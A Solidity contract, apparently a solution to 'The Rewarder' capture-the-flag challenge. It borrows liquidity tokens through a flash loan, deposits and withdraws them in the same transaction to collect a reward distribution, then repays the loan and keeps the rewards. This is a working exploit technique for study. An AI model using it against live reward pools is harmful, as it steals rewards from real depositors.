// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title the-rewarder-attacker
 * @author kootsZhin
 */

contract theRewarderAttacker {

    using Address for address;

    address private _flashLoanPool;
    address private _rewardPool;
    address private _rewardToken;
    address private _liquidityToken;

    constructor(address flashLoanPool, address rewardPool, address rewardToken, address liquidityToken) {
        _flashLoanPool = flashLoanPool;
        _rewardPool = rewardPool;
        _rewardToken = rewardToken;
        _liquidityToken = liquidityToken;
    }

    function attack(uint256 amount) external {
        // call the flash loan to attack here
        _flashLoanPool.functionCall(
            abi.encodeWithSignature(
                "flashLoan(uint256)",
                amount
            )
        );

        // transfer the reward tokens back to attacker's address
        IERC20(_rewardToken).transfer(msg.sender, IERC20(_rewardToken).balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) external {

        // approve the pool to use the liquidity tokens
        IERC20(_liquidityToken).approve(_rewardPool, amount);

        // deposit liquidity tokens into the pool, this will also call the distribute rewards function
        _rewardPool.functionCall(
            abi.encodeWithSignature(
                "deposit(uint256)",
                amount)
        );

        // immediately withdraw liquidity tokens out of the pool
        _rewardPool.functionCall(
            abi.encodeWithSignature(
                "withdraw(uint256)",
                amount)
        );

        // pay back the flash loan
        IERC20(_liquidityToken).transfer(_flashLoanPool, amount);
    }
}